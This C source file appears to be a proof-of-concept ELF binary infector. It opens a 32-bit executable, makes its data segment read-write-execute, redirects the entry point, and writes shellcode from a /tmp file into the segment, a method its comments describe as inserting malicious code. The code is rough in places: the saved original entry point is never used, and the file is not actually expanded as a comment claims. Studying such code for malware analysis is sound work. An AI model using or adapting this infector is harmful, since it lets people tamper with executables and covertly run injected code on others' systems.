//Usage:./datainfection <file_name> (need nopie)
//search by program header
#include <elf.h> // for elf file struct
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>

#define MAX_FILE_PATH_LENGTH 100

unsigned int base_addr = 0x8048000;

void main(int argc,char** argv)
{
    char* filePath = argv[1];
    struct stat file_stat;
    int file_size;

    stat(filePath,&file_stat);
    file_size = file_stat.st_size;
    printf("Target File Size:%d\n",file_size);
    int fd = open(filePath,O_RDWR);
    void* mem = mmap((void*)0x10000000,file_size,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(mem == MAP_FAILED)
    {
        printf("Mmap Failed:%s\n",strerror(errno));
        exit(-1);
    }

    //change data segment flags to RWE , expand file size and mem size(because data is the last segments)
    
    Elf32_Ehdr* Elf32Header = (Elf32_Ehdr*)mem;

    unsigned int phoffset = Elf32Header->e_phoff;
    unsigned int phnum = Elf32Header->e_phnum;
    unsigned int phsize = Elf32Header->e_phentsize;

    unsigned int new_entry;
    unsigned int file_offset;

    Elf32_Phdr* Elf32ProgramHeader = (Elf32_Phdr*)(mem+phoffset);
    for(int i=0; i<phnum ;i++)
    {
        if((Elf32ProgramHeader+i)->p_type == 0x1 && (Elf32ProgramHeader+i)->p_flags == 0x6)
        {
            new_entry = (Elf32ProgramHeader+i)->p_vaddr + (Elf32ProgramHeader+i)->p_filesz;
            file_offset = (Elf32ProgramHeader+i)->p_offset + (Elf32ProgramHeader+i)->p_filesz;
            
            (Elf32ProgramHeader+i)->p_filesz = 0x1000;
            (Elf32ProgramHeader+i)->p_memsz = 0x1000;
            (Elf32ProgramHeader+i)->p_flags = 0x7;
            break;
        }
    }

    //insert malicious code , change entry point
    unsigned int entry = Elf32Header->e_entry;
    unsigned int OriginalEntryAddr = entry;
    printf("New Entry:%x\n",new_entry);
    Elf32Header->e_entry = new_entry;

    char* shellcodePath = "/tmp/shellcode_jmp.bin";
    struct stat shellcode_file_stat;
    int shellcode_file_size;
    stat(shellcodePath,&shellcode_file_stat);
    shellcode_file_size = shellcode_file_stat.st_size;
    printf("shellcode size:%d\n",shellcode_file_size);
    int shellcode_file_fd = open(shellcodePath,O_RDWR);

    unsigned int shellcode_buf[(shellcode_file_size >> 2) + 1];
    read(shellcode_file_fd,shellcode_buf,shellcode_file_size);
    printf("%x\n",shellcode_buf[0]);
    memcpy(mem+file_offset, shellcode_buf, sizeof(shellcode_buf));
}